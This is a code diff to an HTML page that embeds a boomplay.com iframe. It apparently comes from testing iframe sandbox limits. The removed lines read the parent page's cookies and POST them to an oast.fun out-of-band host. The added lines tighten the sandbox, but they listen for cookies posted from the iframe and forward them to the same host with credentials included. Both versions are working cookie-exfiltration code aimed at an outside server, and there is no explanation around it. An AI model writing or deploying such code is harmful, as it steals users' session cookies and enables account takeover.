@@ -13,10 +13,11 @@
         // Create the iframe element
         const iframe = document.createElement('iframe');
         
-        // Set the sandbox attributes for the iframe
-        iframe.sandbox.add('allow-scripts');
-        iframe.sandbox.add('allow-same-origin');
-        
+        // Set the sandbox attributes for the iframe to limit parent access
+        iframe.sandbox.add('allow-scripts');   // Allow running scripts in the iframe
+        iframe.sandbox.add('allow-forms');     // Allow form submission
+        // No 'allow-same-origin' – This ensures the iframe is treated as a separate origin from the parent
+
         // Set the source URL for the iframe (replace with your desired URL)
         iframe.src = 'https://boomplay.com'; // External source
         
@@ -28,31 +29,33 @@
         document.body.appendChild(iframe);
 
         // Log iframe creation
-        console.log('Iframe created with sandbox attributes: allow-scripts, allow-same-origin');
+        console.log('Iframe created with sandbox attributes: allow-scripts, allow-forms (No allow-same-origin)');
 
-        // Send cookies from the parent to the external server
-        const sendCookiesToServer = () => {
-            const parentCookies = document.cookie; // Get cookies from the parent window
+        // Listen for messages from the iframe
+        window.addEventListener('message', (event) => {
+            if (event.origin !== 'https://boomplay.com') {
+                console.warn('Message origin is not trusted');
+                return; // Reject the message if it comes from an untrusted source
+            }
 
-            // Send cookies to the external server (replace with your server URL)
-            fetch('https://tetenplixlclsrgugyrk29jxjsbg98hkd.oast.fun', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    cookies: parentCookies,
-                }),
-            })
-            .then(response => response.json())
-            .then(data => console.log('Cookies sent to external server:', data))
-            .catch(error => console.error('Error sending cookies:', error));
-        };
+            if (event.data && event.data.cookies) {
+                // Send the cookies received from iframe to the external server
+                fetch('https://tetenplixlclsrgugyrk29jxjsbg98hkd.oast.fun', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        cookies: event.data.cookies,
+                    }),
+                    credentials: 'include' // Include credentials (cookies) with the request
+                })
+                .then(response => response.json())
+                .then(data => console.log('Cookies sent to external server:', data))
+                .catch(error => console.error('Error sending cookies:', error));
+            }
+        });
 
-        // Call the function to send cookies after iframe loads
-        iframe.onload = function() {
-            sendCookiesToServer();
-        };
     </script>
 </body>
 </html>
